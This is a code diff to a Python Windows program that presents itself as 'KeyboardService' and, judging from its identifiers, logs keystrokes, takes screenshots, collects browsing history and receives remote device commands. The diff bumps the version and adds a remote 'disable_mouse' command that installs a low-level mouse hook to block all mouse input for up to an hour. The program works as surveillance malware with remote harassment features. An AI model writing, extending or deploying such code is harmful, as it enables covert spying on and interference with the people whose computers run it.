@@ -23,7 +23,7 @@ from io import BytesIO
 from urllib.parse import urlparse
 from ctypes import wintypes
 from queue import Queue
-from threading import Lock, Thread, Timer
+from threading import Event, Lock, Thread, Timer
 from urllib.error import URLError, HTTPError
 from urllib.request import Request, urlopen
 from PIL import ImageGrab
@@ -45,7 +45,7 @@ WEBSITE_HISTORY_INTERVAL_SECONDS = 30
 WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
-APP_VERSION = "1.0.2"
+APP_VERSION = "1.0.3"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -102,6 +102,8 @@ last_message_id = 0
 SERVICE_KEYBOARD_LISTENER = None
 collection_paused = False
 update_lock = Lock()
+mouse_disable_lock = Lock()
+mouse_hook_callback = None
 
 SHIFTED_SYMBOLS = {
     "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
@@ -779,6 +781,16 @@ def handle_device_command(command, command_id=None, message=""):
             collection_paused = True
         elif command == "resume":
             collection_paused = False
+        elif command == "disable_mouse":
+            if os.name != "nt":
+                raise RuntimeError("Mouse disabling is only supported on Windows")
+            try:
+                duration = int(str(message).strip())
+            except ValueError as error:
+                raise RuntimeError("Mouse duration must be a whole number of seconds") from error
+            if duration < 1 or duration > 3600:
+                raise RuntimeError("Mouse duration must be between 1 and 3600 seconds")
+            start_mouse_disable(duration)
         elif command == "message":
             if os.name != "nt":
                 raise RuntimeError("Message boxes are only supported on Windows")
@@ -788,6 +800,57 @@ def handle_device_command(command, command_id=None, message=""):
         acknowledge_device_command(command_id, "completed")
     except (OSError, RuntimeError, AttributeError) as error:
         acknowledge_device_command(command_id, "failed", str(error))
+
+
+def start_mouse_disable(duration):
+    if not mouse_disable_lock.acquire(blocking=False):
+        raise RuntimeError("Mouse is already disabled")
+
+    ready = Event()
+    result = {}
+    Thread(target=mouse_disable_worker, args=(duration, ready, result), daemon=True).start()
+    if not ready.wait(1):
+        raise RuntimeError("Mouse hook did not start")
+    if result.get("error"):
+        mouse_disable_lock.release()
+        raise RuntimeError(result["error"])
+
+
+def mouse_disable_worker(duration, ready, result):
+    global mouse_hook_callback
+    user32 = ctypes.windll.user32
+    kernel32 = ctypes.windll.kernel32
+    hook_type = 14
+    callback_type = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
+
+    def low_level_mouse_proc(_code, _wparam, _lparam):
+        return 1
+
+    mouse_hook_callback = callback_type(low_level_mouse_proc)
+    hook = user32.SetWindowsHookExW(hook_type, mouse_hook_callback, kernel32.GetModuleHandleW(None), 0)
+    if not hook:
+        result["error"] = f"Could not install mouse hook: {ctypes.get_last_error()}"
+        ready.set()
+        mouse_disable_lock.release()
+        return
+
+    thread_id = kernel32.GetCurrentThreadId()
+    ready.set()
+    try:
+        end_time = time.monotonic() + duration
+        message = wintypes.MSG()
+        while time.monotonic() < end_time:
+            if user32.PeekMessageW(ctypes.byref(message), None, 0, 0, 1):
+                if message.message == 0x0012:
+                    break
+                user32.TranslateMessage(ctypes.byref(message))
+                user32.DispatchMessageW(ctypes.byref(message))
+            else:
+                time.sleep(0.05)
+    finally:
+        user32.UnhookWindowsHookEx(hook)
+        mouse_hook_callback = None
+        mouse_disable_lock.release()
 
 
 def get_battery_telemetry():
